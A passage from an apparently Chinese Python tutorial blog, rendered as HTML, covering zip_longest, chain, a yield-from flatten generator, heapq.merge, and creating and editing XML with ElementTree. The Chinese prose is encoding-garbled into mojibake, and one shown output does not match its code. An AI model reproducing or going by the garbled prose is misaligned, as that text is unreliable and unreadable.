class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>a = [<span class="number">1</span>,<span class="number">3</span>,<span class="number">5</span>]</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>b = [<span class="string">'e'</span>,<span class="string">'l'</span>,<span class="string">'s'</span>,<span class="string">'s'</span>,<span class="string">'m'</span>]</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">from</span> itertools <span class="keyword">import</span> zip_longest</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">for</span> i <span class="keyword">in</span> zip_longest(a,b):</span><br><span class="line"><span class="meta">... </span>    print(i)</span><br><span class="line">...</span><br><span class="line">(<span class="number">1</span>, <span class="string">'e'</span>)</span><br><span class="line">(<span class="number">3</span>, <span class="string">'l'</span>)</span><br><span class="line">(<span class="number">5</span>, <span class="string">'s'</span>)</span><br><span class="line">(<span class="literal">None</span>, <span class="string">'s'</span>)</span><br><span class="line">(<span class="literal">None</span>, <span class="string">'m'</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">for</span> i <span class="keyword">in</span> zip_longest(a,b,fillvalue=<span class="number">0</span>):</span><br><span class="line"><span class="meta">... </span>    print(i)</span><br><span class="line">...</span><br><span class="line">(<span class="number">1</span>, <span class="string">'e'</span>)</span><br><span class="line">(<span class="number">3</span>, <span class="string">'l'</span>)</span><br><span class="line">(<span class="number">5</span>, <span class="string">'s'</span>)</span><br><span class="line">(<span class="number">0</span>, <span class="string">'s'</span>)</span><br><span class="line">(<span class="number">0</span>, <span class="string">'m'</span>)</span><br></pre></td></tr></table></figure><p>ä½¿ç”¨<code>zip()</code>å‡½æ•°å¯ä»¥å°†æ•°æ®æ‰“åŒ…å¹¶ç”Ÿæˆä¸€ä¸ªå­—å…¸ï¼Œç¤ºä¾‹å¦‚ä¸‹ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>key=[<span class="string">'name'</span>,<span class="string">'age'</span>,<span class="string">'sex'</span>]</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>value = [<span class="string">'elssm'</span>,<span class="string">'24'</span>,<span class="string">'ç”·'</span>]</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>s = dict(zip(key,value))</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>s</span><br><span class="line">&#123;<span class="string">'name'</span>: <span class="string">'elssm'</span>, <span class="string">'age'</span>: <span class="string">'24'</span>, <span class="string">'sex'</span>: <span class="string">'ç”·'</span>&#125;</span><br></pre></td></tr></table></figure><p>æœ€åå¼ºè°ƒä¸€ç‚¹å°±æ˜¯ï¼Œ<code>zip()</code>ä¼šåˆ›å»ºä¸€ä¸ªè¿­ä»£å™¨æ¥ä½œä¸ºç»“æœè¿”å›ã€‚ å¦‚æœä½ éœ€è¦å°†ç»“å¯¹çš„å€¼å­˜å‚¨åœ¨åˆ—è¡¨ä¸­ï¼Œè¦ä½¿ç”¨<code>list()</code>å‡½æ•°ã€‚ç¤ºä¾‹å¦‚ä¸‹ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>a = [<span class="number">1</span>,<span class="number">3</span>,<span class="number">5</span>,<span class="number">7</span>,<span class="number">9</span>]</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>b =[<span class="number">2</span>,<span class="number">4</span>,<span class="number">6</span>,<span class="number">8</span>,<span class="number">10</span>]</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>zip(a,b)</span><br><span class="line">&lt;zip object at <span class="number">0x00000254B2799640</span>&gt;</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>list(zip(a,b))</span><br><span class="line">[(<span class="number">1</span>, <span class="number">2</span>), (<span class="number">3</span>, <span class="number">4</span>), (<span class="number">5</span>, <span class="number">6</span>), (<span class="number">7</span>, <span class="number">8</span>), (<span class="number">9</span>, <span class="number">10</span>)]</span><br></pre></td></tr></table></figure><h4 id="ä¸åŒé›†åˆä¸Šå…ƒç´ çš„è¿­ä»£"><a href="#ä¸åŒé›†åˆä¸Šå…ƒç´ çš„è¿­ä»£" class="headerlink" title="ä¸åŒé›†åˆä¸Šå…ƒç´ çš„è¿­ä»£"></a>ä¸åŒé›†åˆä¸Šå…ƒç´ çš„è¿­ä»£</h4><p><code>itertools.chain()</code>æ–¹æ³•æ¥å—ä¸€ä¸ªå¯è¿­ä»£å¯¹è±¡åˆ—è¡¨ä½œä¸ºè¾“å…¥ï¼Œå¹¶è¿”å›ä¸€ä¸ªè¿­ä»£å™¨ï¼Œç¤ºä¾‹å¦‚ä¸‹ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">from</span> itertools <span class="keyword">import</span> chain</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>a = [<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>]</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>b = [<span class="string">'x'</span>,<span class="string">'y'</span>,<span class="string">'z'</span>]</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">for</span> x <span class="keyword">in</span> chain(a,b):</span><br><span class="line"><span class="meta">... </span>    print(x)</span><br><span class="line">...</span><br><span class="line"><span class="number">1</span></span><br><span class="line"><span class="number">2</span></span><br><span class="line"><span class="number">3</span></span><br><span class="line"><span class="number">4</span></span><br><span class="line">x</span><br><span class="line">y</span><br><span class="line">z</span><br></pre></td></tr></table></figure><p>ä½¿ç”¨<code>chain</code>çš„ä¸€ä¸ªå¸¸è§åœºæ™¯æ˜¯å½“ä½ ç›¸å¯¹ä¸åŒçš„é›†åˆä¸­æ‰€æœ‰å…ƒç´ æ‰§è¡ŒæŸäº›æ“ä½œæ—¶ï¼Œç¤ºä¾‹å¦‚ä¸‹ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">active_items = set()</span><br><span class="line">inactive_items = set()</span><br><span class="line"></span><br><span class="line"><span class="comment"># Iterate over all items</span></span><br><span class="line"><span class="keyword">for</span> item <span class="keyword">in</span> chain(active_items, inactive_items):</span><br><span class="line">    <span class="comment"># Process item</span></span><br></pre></td></tr></table></figure><p>è¿™ç§è§£å†³æ–¹æ¡ˆè¦æ¯”ä½¿ç”¨ä¸¤ä¸ªå•ç‹¬çš„å¾ªç¯å¤„ç†æ›´åŠ ä¼˜é›…ã€‚</p><h4 id="å±•å¼€åµŒå¥—çš„åºåˆ—"><a href="#å±•å¼€åµŒå¥—çš„åºåˆ—" class="headerlink" title="å±•å¼€åµŒå¥—çš„åºåˆ—"></a>å±•å¼€åµŒå¥—çš„åºåˆ—</h4><p>å¦‚æœæƒ³å°†ä¸€ä¸ªå¤šå±‚åµŒå¥—çš„åºåˆ—å±•å¼€æˆä¸€ä¸ªå•å±‚åˆ—è¡¨ï¼Œå¯ä»¥å†™ä¸€ä¸ªåŒ…å«<code>yield from</code>è¯­å¥çš„é€’å½’ç”Ÿæˆå™¨æ¥å¤„ç†ï¼Œç¤ºä¾‹å¦‚ä¸‹ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> collections.abc <span class="keyword">import</span> Iterable</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">flatten</span><span class="params">(item, ignore_types=<span class="params">(str, bytes)</span>)</span>:</span></span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> item:</span><br><span class="line">        <span class="keyword">if</span> isinstance(x, Iterable) <span class="keyword">and</span> <span class="keyword">not</span> isinstance(x, ignore_types):</span><br><span class="line">            <span class="keyword">yield</span> <span class="keyword">from</span> flatten(x)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">yield</span> x</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">items = [<span class="number">1</span>, <span class="number">2</span>, [<span class="number">3</span>, <span class="number">4</span>, [<span class="number">5</span>, <span class="number">6</span>], <span class="number">7</span>], <span class="number">8</span>]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> flatten(items):</span><br><span class="line">    print(i)</span><br></pre></td></tr></table></figure><p>åœ¨ä¸Šè¿°ä»£ç ä¸­ï¼Œ<code>isinstance(x,Iterable)</code>æ£€æŸ¥æŸä¸ªå…ƒç´ æ˜¯å¦æ˜¯å¯è¿­ä»£çš„ï¼Œå¦‚æœæ˜¯ï¼Œ<code>yield from</code>å°±ä¼šè¿”å›æ‰€æœ‰å­ä¾‹ç¨‹çš„å€¼ï¼Œæœ€ç»ˆè¿”å›ç»“æœå°±æ˜¯ä¸€ä¸ªæ²¡æœ‰åµŒå¥—çš„ç®€å•åºåˆ—ï¼Œé¢å¤–çš„å‚æ•°<code>ignore_types</code>å’Œæ£€æµ‹è¯­å¥<code>isinstance(x,ignore_types)</code>ç”¨æ¥å°†å­—ç¬¦ä¸²å’Œå­—èŠ‚æ’é™¤åœ¨å¯è¿­ä»£å¯¹è±¡å¤–ï¼Œé˜²æ­¢å°†å®ƒä»¬å†å±•å¼€æˆå•ä¸ªå­—ç¬¦ï¼Œç¤ºä¾‹å¦‚ä¸‹:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> collections.abc <span class="keyword">import</span> Iterable</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">flatten</span><span class="params">(item, ignore_types=<span class="params">(str, bytes)</span>)</span>:</span></span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> item:</span><br><span class="line">        <span class="keyword">if</span> isinstance(x, Iterable) <span class="keyword">and</span> <span class="keyword">not</span> isinstance(x, ignore_types):</span><br><span class="line">            <span class="keyword">yield</span> <span class="keyword">from</span> flatten(x)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">yield</span> x</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">items = [<span class="string">'Dave'</span>, <span class="string">'Paula'</span>, [<span class="string">'Thomas'</span>, <span class="string">'Lewis'</span>]]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> flatten(items):</span><br><span class="line">    print(i)</span><br></pre></td></tr></table></figure><p>è¯­å¥<code>yield from</code>åœ¨ä½ æƒ³åœ¨ç”Ÿæˆå™¨ä¸­è°ƒç”¨å…¶ä»–ç”Ÿæˆå™¨ä½œä¸ºå­ä¾‹ç¨‹æ—¶éå¸¸æœ‰ç”¨ï¼Œå¦‚æœä½ ä¸æƒ³åœ¨ä»£ç ä¸­ä½¿ç”¨ï¼Œé‚£ä¹ˆéœ€è¦å†™é¢å¤–çš„<code>for</code>å¾ªç¯ï¼Œç¤ºä¾‹å¦‚ä¸‹ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">flatten</span><span class="params">(items, ignore_types=<span class="params">(str, bytes)</span>)</span>:</span></span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> items:</span><br><span class="line">        <span class="keyword">if</span> isinstance(x, Iterable) <span class="keyword">and</span> <span class="keyword">not</span> isinstance(x, ignore_types):</span><br><span class="line">            <span class="keyword">for</span> i <span class="keyword">in</span> flatten(x):</span><br><span class="line">                <span class="keyword">yield</span> i</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">yield</span> x</span><br></pre></td></tr></table></figure><h4 id="é¡ºåºè¿­ä»£åˆå¹¶åçš„æ’åºè¿­ä»£å¯¹è±¡"><a href="#é¡ºåºè¿­ä»£åˆå¹¶åçš„æ’åºè¿­ä»£å¯¹è±¡" class="headerlink" title="é¡ºåºè¿­ä»£åˆå¹¶åçš„æ’åºè¿­ä»£å¯¹è±¡"></a>é¡ºåºè¿­ä»£åˆå¹¶åçš„æ’åºè¿­ä»£å¯¹è±¡</h4><p>å¦‚æœæœ‰ä¸€ç³»åˆ—çš„æ’åºåºåˆ—ï¼Œæƒ³å°†å®ƒä»¬åˆå¹¶åå¾—åˆ°ä¸€ä¸ªæ’åºåºåˆ—å¹¶åœ¨ä¸Šé¢è¿­ä»£éå†ã€‚å¯ä»¥ä½¿ç”¨<code>heapq.merge()</code>å‡½æ•°ï¼Œç¤ºä¾‹å¦‚ä¸‹ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">import</span> heapq</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>a = [<span class="number">1</span>,<span class="number">3</span>,<span class="number">5</span>,<span class="number">7</span>,<span class="number">9</span>]</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>b = [<span class="number">2</span>,<span class="number">4</span>,<span class="number">6</span>,<span class="number">8</span>,<span class="number">10</span>]</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">for</span> c <span class="keyword">in</span> heapq.merge(a,b):</span><br><span class="line"><span class="meta">... </span>    print(c)</span><br><span class="line">...</span><br><span class="line"><span class="number">1</span></span><br><span class="line"><span class="number">2</span></span><br><span class="line"><span class="number">3</span></span><br><span class="line"><span class="number">4</span></span><br><span class="line"><span class="number">5</span></span><br><span class="line"><span class="number">6</span></span><br><span class="line"><span class="number">7</span></span><br><span class="line"><span class="number">8</span></span><br><span class="line"><span class="number">9</span></span><br><span class="line"><span class="number">10</span></span><br></pre></td></tr></table></figure><h3 id="æ•°æ®ç¼–ç ä¸å¤„ç†"><a href="#æ•°æ®ç¼–ç ä¸å¤„ç†" class="headerlink" title="æ•°æ®ç¼–ç ä¸å¤„ç†"></a>æ•°æ®ç¼–ç ä¸å¤„ç†</h3><h4 id="å°†å­—å…¸è½¬æ¢ä¸ºXML"><a href="#å°†å­—å…¸è½¬æ¢ä¸ºXML" class="headerlink" title="å°†å­—å…¸è½¬æ¢ä¸ºXML"></a>å°†å­—å…¸è½¬æ¢ä¸ºXML</h4><p><code>xml.etree.ElementTree</code>åº“é€šå¸¸ç”¨æ¥åšè§£æå·¥ä½œï¼Œå…¶å®ä¹Ÿå¯ä»¥åˆ›å»º<code>XML</code>æ–‡æ¡£ã€‚å¦‚ä¸‹å‡½æ•°æ‰€ç¤ºï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> xml.etree.ElementTree <span class="keyword">import</span> Element,tostring</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dict_to_xml</span><span class="params">(tag, d)</span>:</span></span><br><span class="line">    elem = Element(tag)</span><br><span class="line">    <span class="keyword">for</span> key, val <span class="keyword">in</span> d.items():</span><br><span class="line">        child = Element(key)</span><br><span class="line">        child.text = str(val)</span><br><span class="line">        elem.append(child)</span><br><span class="line">    <span class="keyword">return</span> elem</span><br></pre></td></tr></table></figure><p>å‡½æ•°ä½¿ç”¨ç¤ºä¾‹å¦‚ä¸‹ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>s = &#123; <span class="string">'name'</span>: <span class="string">'GOOG'</span>, <span class="string">'shares'</span>: <span class="number">100</span>, <span class="string">'price'</span>:<span class="number">490.1</span> &#125;</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>e = dict_to_xml(<span class="string">'stock'</span>, s)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>e</span><br><span class="line">&lt;Element <span class="string">'stock'</span> at <span class="number">0x1004b64c8</span>&gt;</span><br><span class="line">&gt;&gt;&gt;</span><br></pre></td></tr></table></figure><p>è½¬æ¢ç»“æœæ˜¯ä¸€ä¸ª<code>Element</code>å®ä¾‹ã€‚å¯¹äº<code>I/O</code>æ“ä½œï¼Œä½¿ç”¨<code>xml.etree.ElementTree</code>ä¸­çš„<code>tostring()</code>å‡½æ•°å¾ˆå®¹æ˜“å°±èƒ½å°†å®ƒè½¬æ¢æˆä¸€ä¸ªå­—èŠ‚å­—ç¬¦ä¸²ã€‚ç¤ºä¾‹å¦‚ä¸‹ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">from</span> xml.etree.ElementTree <span class="keyword">import</span> tostring</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>tostring(e)</span><br><span class="line"><span class="string">b'&lt;stock&gt;&lt;price&gt;490.1&lt;/price&gt;&lt;shares&gt;100&lt;/shares&gt;&lt;name&gt;GOOG&lt;/name&gt;&lt;/stock&gt;'</span></span><br><span class="line">&gt;&gt;&gt;</span><br></pre></td></tr></table></figure><p>å¦‚æœæƒ³ç»™æŸä¸ªå…ƒç´ æ·»åŠ å±æ€§å€¼ï¼Œå¯ä»¥ä½¿ç”¨<code>set()</code>æ–¹æ³•ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>e.set(<span class="string">'_id'</span>,<span class="string">'1234'</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>tostring(e)</span><br><span class="line"><span class="string">b'&lt;stock _id="1234"&gt;&lt;price&gt;490.1&lt;/price&gt;&lt;shares&gt;100&lt;/shares&gt;&lt;name&gt;GOOG&lt;/name&gt;</span></span><br><span class="line"><span class="string">&lt;/stock&gt;'</span></span><br><span class="line">&gt;&gt;&gt;</span><br></pre></td></tr></table></figure><h4 id="è§£æå’Œä¿®æ”¹XML"><a href="#è§£æå’Œä¿®æ”¹XML" class="headerlink" title="è§£æå’Œä¿®æ”¹XML"></a>è§£æå’Œä¿®æ”¹XML</h4><p>ä½¿ç”¨<code>xml.etree.ElementTree</code>æ¨¡å—å¯ä»¥å®Œæˆè¯¥æ“ä½œï¼Œå‡è®¾æœ‰å¦‚ä¸‹åä¸º<code>pred.xml</code>çš„æ–‡æ¡£å†…å®¹å¦‚ä¸‹ï¼š</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0"?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">stop</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">id</span>&gt;</span>14791<span class="tag">&lt;/<span class="name">id</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">nm</span>&gt;</span>Clark <span class="symbol">&amp;amp;</span> Balmoral<span class="tag">&lt;/<span class="name">nm</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">sri</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">rt</span>&gt;</span>22<span class="tag">&lt;/<span class="name">rt</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">d</span>&gt;</span>North Bound<span class="tag">&lt;/<span class="name">d</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">dd</span>&gt;</span>North Bound<span class="tag">&lt;/<span class="name">dd</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">sri</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">cr</span>&gt;</span>22<span class="tag">&lt;/<span class="name">cr</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">pre</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">pt</span>&gt;</span>5 MIN<span class="tag">&lt;/<span class="name">pt</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">fd</span>&gt;</span>Howard<span class="tag">&lt;/<span class="name">fd</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">v</span>&gt;</span>1378<span class="tag">&lt;/<span class="name">v</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">rn</span>&gt;</span>22<span class="tag">&lt;/<span class="name">rn</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">pre</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">pre</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">pt</span>&gt;</span>15 MIN<span class="tag">&lt;/<span class="name">pt</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">fd</span>&gt;</span>Howard<span class="tag">&lt;/<span class="name">fd</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">v</span>&gt;</span>1867<span class="tag">&lt;/<span class="name">v</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">rn</span>&gt;</span>22<span class="tag">&lt;/<span class="name">rn</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">pre</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">stop</span>&gt;</span></span><br></pre></td></tr></table></figure><p>ä¸‹é¢æ˜¯ä¸€ä¸ªåˆ©ç”¨<code>ElementTree</code>æ¥è¯»å–è¿™ä¸ªæ–‡æ¡£å¹¶å¯¹å®ƒåšä¸€äº›ä¿®æ”¹çš„ä¾‹å­ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">from</span> xml.etree.ElementTree <span class="keyword">import</span> parse,Element</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>doc = parse(<span class="string">'pred.xml'</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>root = doc.getroot()</span><br><span class="line">root</span><br><span class="line">&lt;Element <span class="string">'stop'</span> at <span class="number">0x00000204D519FB30</span>&gt;</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>root.remove(root.find(<span class="string">'sri'</span>))</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>root.remove(root.find(<span class="string">'cr'</span>))</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>root.getchildren().index(root.find(<span class="string">'nm'</span>))</span><br><span class="line"><span class="number">1</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>e = Element(<span class="string">'spam'</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>e.text = <span class="string">'this is a test'</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>root.insert(<span class="number">2</span>,e)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>doc.write(<span class="string">"newpred.xml"</span>,xml_declaration=<span class="literal">True</span>)</span><br></pre></td></tr></table></figure><p>æ–°ç”Ÿæˆçš„<code>newpred.xml</code>æ–‡æ¡£å†…å®¹å¦‚ä¸‹ï¼š</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version='1.0' encoding='us-ascii'?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">stop</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">id</span>&gt;</span>14791<span class="tag">&lt;/<span class="name">id</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">nm</span>&gt;</span>Clark <span class="symbol">&amp;amp;</span> Balmoral<span class="tag">&lt;/<span class="name">nm</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">spam</span>&gt;</span>This is a test<span class="tag">&lt;/<span class="name">spam</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">pre</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">pt</span>&gt;</span>5 MIN<span class="tag">&lt;/<span class="name">pt</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">fd</span>&gt;</span>Howard<span class="tag">&lt;/<span class="name">fd</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">v</span>&gt;</span>1378<span class="tag">&lt;/<span class="name">v</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">rn</span>&gt;</span>22<span class="tag">&lt;/<span class="name">rn</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">pre</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">pre</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">pt</span>&gt;</span>15 MIN<span class="tag">&lt;/<span class="name">pt</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">fd</span>&gt;</span>Howard<span class="tag">&lt;/<span class="name">fd</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">v</span>&gt;</span>1867<span class="tag">&lt;/<span class="name">v</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">rn</span>&gt;</span>22<span class="tag">&lt;/<span class="name">rn</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">pre</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">stop</span>&gt;</span></span><br></pre></td></tr></table></figure><p>ä¿®æ”¹ä¸€ä¸ª<code>XML</code>æ–‡æ¡£ç»“æ„æ˜¯å¾ˆå®¹æ˜“çš„ï¼Œä½†æ˜¯ä½ å¿…é¡»ç‰¢è®°çš„æ˜¯æ‰€æœ‰çš„ä¿®æ”¹éƒ½æ˜¯é’ˆå¯¹çˆ¶èŠ‚ç‚¹å…ƒç´ ï¼Œ å°†å®ƒä½œä¸ºä¸€ä¸ªåˆ—è¡¨æ¥å¤„ç†ã€‚ä¾‹å¦‚ï¼Œå¦‚æœä½ åˆ é™¤æŸä¸ªå…ƒç´ ï¼Œé€šè¿‡è°ƒç”¨çˆ¶èŠ‚ç‚¹çš„<code>remove()</code>æ–¹æ³•ä»å®ƒçš„ç›´æ¥çˆ¶èŠ‚ç‚¹ä¸­åˆ é™¤ã€‚ 